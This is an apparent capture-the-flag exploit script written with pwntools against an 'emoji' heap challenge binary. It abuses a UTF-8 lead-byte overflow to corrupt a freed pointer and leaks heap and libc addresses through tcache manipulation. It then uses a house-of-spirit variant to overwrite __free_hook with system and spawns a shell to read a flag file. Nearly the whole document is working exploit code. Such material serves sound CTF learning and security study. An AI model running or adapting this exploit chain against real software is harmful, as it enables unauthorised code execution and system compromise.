#!/usr/bin/python3
from pwn import *
import sys


def add(title, emoji):
    p.sendlineafter(b"> ", b"1")
    p.sendafter(b": ", title)
    p.sendafter(b": ", emoji)


def read(idx, emoji=False):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b": ", str(idx).encode('latin1'))
    p.recvuntil(b": ")
    title = p.recvline()[:-1]
    if emoji:
        p.recvuntil(b": ")
        emoji = p.recvline()
        return title, emoji
    return title


def delete(idx):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b": ", str(idx).encode())


def collect():
    p.sendlineafter(b"> ", b"4")


e = ELF("./src/emoji")
context.arch = "amd64"
if args.REMOTE:
    # d371da546786965fe0ee40147ffef716
    libc = ELF("libc6_2.31-0ubuntu9.2_amd64.so", checksec=False)
    p = remote(args.HOST, int(args.PORT))
    arena = 0x1ebbe0
else:
    libc = ELF("/usr/lib/libc.so.6", checksec=False)
    p = e.process()
    arena = 0

heapoffset = 0x1590
"""
VULN: The program checks how many leading 1s there are(at the beginning of the byte)
And then reads the this amount - 1 after the first byte. This is due to the way utf-8 works and coding for the amount of characters in a given code.
However, the emoji data is only 4 bytes, the 1st byte being the control byte. We can have more leading 1s than would be in
a classic utf-8 code, for example, the byte 1111 1111. This would give us 7 bytes of input after the initial character. This gives us 4
bytes of overflow into the title pointer.
Partial overflow. Furthermore, this pointer gets freed eventually, so we can control a freed pointer
Say we overflow the last byte to be 0x10 more. This means that the chunk that the heap *thinks* its freeing
is within our control. Arbitrary free chunk control, etc. etc.
"""
# Align the heap so that after the last 3 nibbles it is constant between the title field and some other chunk
# Therefore we can just overwrite the last byte
add(b"First", b"\xfftes")  # 0
add(b"Second", b"\xfftes")  # 1

add(b"Third", b"\xffAAA\xe0")  # 2
add(b"Fourth", b"\xfftes")  # 3
add(b"Fifth", b"\xfftes")  # 4

delete(4)
# Now the title field of the third emoji actually points to the title field of the fourth emoji
delete(3)
collect()
# Now the title field of the third emoji points to a free chunk. Heap leak
heapleak = u64(read(2).ljust(8, b'\x00'))
log.info(f"Heap leak: {hex(heapleak)}")
# Reallocate 4th and fifth chunks
add(b"Fourth", b"\xfftes")  # 3
add(b"Fifth", b"\xfftes")  # 4
# To libc leak, repeat the same thing but... weird.
# We must fill up the tcache. Then free the fourth chunk so that its in a bin with a libc leak
# Because of how the file works, this is easy.
# We can make a sixth chunk, delete, make it again, delete, etc. and then simply garbage collect
for i in range(7):
    add(b"Sixth", b"\xfftes")  # 5
    delete(5)
delete(3)
collect()
leak = u64(read(2).ljust(8, b'\x00'))
log.info(f"Libc leak: {hex(leak)}")
heapbase = heapleak - heapoffset
libc.address = leak - arena
log.info(f"Libc base: {hex(libc.address)}")
log.info(f"Heap base: {hex(heapbase)}")
# Up until now, its just been allocations, deletions and a small little bit of overflow to manipulate chunks.
# That is, no corruption
# But that's about to change.
# Let's execute a modified house of spirit - free a chunk within another, then reallocate there to get some overflow
# Get two chunks, put the one that is at a higher address into the tcache, then execute the attack.
add(b"To be freed", b"\xfftes")  # 3
add(b"JustLeak", b"\xfftes")  # 5
# Leak lower bytes
lower = u32(read(5, True)[1][4:8])
# Reallocate in same position, this time manipulate title pointer for house of spirit
delete(3)
delete(5)
collect()
fake = b"A" * 64 + p64(0) + p64(0x91)
print(hex(lower + 80))

add(fake,b"\xfftes" + p32(lower + 80)) # 3
# Reallocate AGAIN, this time the magic happens
delete(3)
collect()
newdata = flat(b"/bin/sh".ljust(7 * 8, b'\x00'), 0x21, libc.symbols['__realloc_hook'], b'A' * 16, 0x91,
               libc.symbols['__free_hook'])

add(newdata, b"\xfftes")  # 3
add(b"About to exploit", "😮".encode())
add(p64(libc.symbols['system']), "😎".encode())
# Free fourth chunk to trigger it all
delete(3)
collect()
p.sendline(b"cat /flag.txt")

# print(p.recv(timeout=1).decode())
p.interactive()
